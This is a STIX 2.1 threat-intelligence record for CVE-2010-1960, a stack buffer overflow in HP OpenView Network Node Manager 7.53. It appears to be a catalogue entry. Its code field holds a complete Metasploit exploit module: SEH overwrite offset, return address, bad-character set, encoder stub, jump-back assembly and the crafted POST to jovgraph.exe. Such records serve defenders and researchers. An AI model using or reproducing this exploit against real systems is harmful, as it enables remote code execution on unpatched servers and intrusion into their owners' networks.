{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--074043d0-4dc9-4a9f-860b-8f39d9e1617f",
    "created": "2024-08-14T16:51:52.995788Z",
    "modified": "2024-08-14T16:51:52.995792Z",
    "name": "HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe' CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code. The vulnerable code is within the option parsing function within \"ovwebsnmpsrv.exe\" with a timestamp prior to April 7th, 2010.  Reaching the vulnerable code requires a 'POST' request with an 'arg' parameter that, when combined with some static text, exceeds 10240 bytes. The parameter must begin with a dash. It is important to note that this vulnerability must be exploited by overwriting SEH. This is since overflowing the buffer with controllable data always triggers an access violation when attempting to write static text beyond the end of the stack.  Exploiting this issue is a bit tricky due to a restrictive character set. In order to accomplish arbitrary code execution, a double-backward jump is used in combination with the Alpha2 encoder. } ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_nnm_ovwebsnmpsrv_uro.rb",
            "external_id": "hp_nnm_ovwebsnmpsrv_uro.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1960"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/jovgraph.exe', :pattern => /Hewlett-Packard Development Company/ }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53\n        prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe'\n        CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.\n        The vulnerable code is within the option parsing function within \"ovwebsnmpsrv.exe\" with a\n        timestamp prior to April 7th, 2010.\n\n        Reaching the vulnerable code requires a 'POST' request with an 'arg' parameter that, when combined\n        with some static text, exceeds 10240 bytes. The parameter must begin with a dash. It is\n        important to note that this vulnerability must be exploited by overwriting SEH. This is since\n        overflowing the buffer with controllable data always triggers an access violation when\n        attempting to write static text beyond the end of the stack.\n\n        Exploiting this issue is a bit tricky due to a restrictive character set. In order to accomplish\n        arbitrary code execution, a double-backward jump is used in combination with the Alpha2\n        encoder.\n      } ,\n      'Author'         =>\n        [\n          'jduck'   # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-1960' ],\n          [ 'OSVDB', '65427' ],\n          [ 'BID', '40637' ],\n          [ 'ZDI', '10-105' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 10240, # 10240 byte buffer..\n          # In addition to regular HTTP type bad chars, this one also has\n          # an issue with \" since the buffer is being passed on the command line.\n          'BadChars' => (0x00..0x1f).to_a.pack('C*') + \"\\x20\\x21\\x22\\x24\\x2c\\x3b\\x3c\\x3e\\x60\",\n          'DisableNops' => true,\n          # Manually use FPU to get EIP into ECX\n          'PrependEncoder' => \"\\x89\\xe2\\xdb\\xdb\\xd9\\x72\\xf4\\x59\\x83\\xe9\\xf7\",\n          'EncoderOptions' => { 'BufferRegister' => 'ecx' },\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'HP OpenView Network Node Manager 7.53 w/NNM_01206',\n            {\n              'Ret'     => 0x5a238ba7, # pop edx/pop ebp/ret - in ovsnmp.dll v1.30.10.9166\n            }\n          ],\n          [ 'Debug Target',\n            {\n              'Ret'     => 0xdeadbeef, # crasher\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-06-08'))\n  end\n\n  def exploit\n\n    print_status(\"Trying target #{target.name}...\")\n\n    cgi = '/OvCgi/jovgraph.exe'\n\n    # A long command line option (starts with -) will cause a buffer overflow.\n\n    # Action just has to be set, doesn't matter what it is.\n    action = rand_text_alphanumeric(1)\n\n    # \"timestamp\" cannot be set.\n\n    start = 'Unrecognized option: '\n\n    # SEH\n    seh_offset = 0x2cb0  # 0x13ffb0 - 0x13d300\n    seh_frame = generate_seh_record(target.ret)\n\n    # Jump back to the payload, after p/p/r jumps to us.\n    # NOTE: Putting the jmp_back after the SEH handler seems to avoid problems with badchars..\n    # 8 for SEH.Next+SEH.Func, 5 for the jmp_back itself\n    distance = seh_offset - 1 + seh_frame.length # dry run\n    jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n    distance = seh_offset - start.length - 1 - jmp_back.length\n    jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n\n    # A short jump back to the long jump back :)\n    jmp_small = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + jmp_back.length.to_s).encode_string\n    jmp_small << rand_text(2)\n\n    buf = '-'\n    buf << payload.encoded\n    buf << \"A\" * (seh_offset - start.length - buf.length - jmp_back.length)\n    buf << jmp_back\n    buf << jmp_small\n    buf << [target.ret].pack('V')\n\n    # Send the request\n    res = send_request_cgi({\n      'uri'\t\t  => cgi,\n      'method'\t  => \"POST\",\n      'vars_post' =>\n        {\n          'act' => action,\n          'arg' => buf,\n        }\n    }, 3)\n\n    if res and res.code != 502\n      print_error(\"Eek! We weren't expecting a response, but we got one\")\n      print_status(res.to_s) if datastore['NNM_DEBUG']\n    end\n\n    handler\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-06-08",
    "x_mitre_platforms": [
        "win'"
    ]
}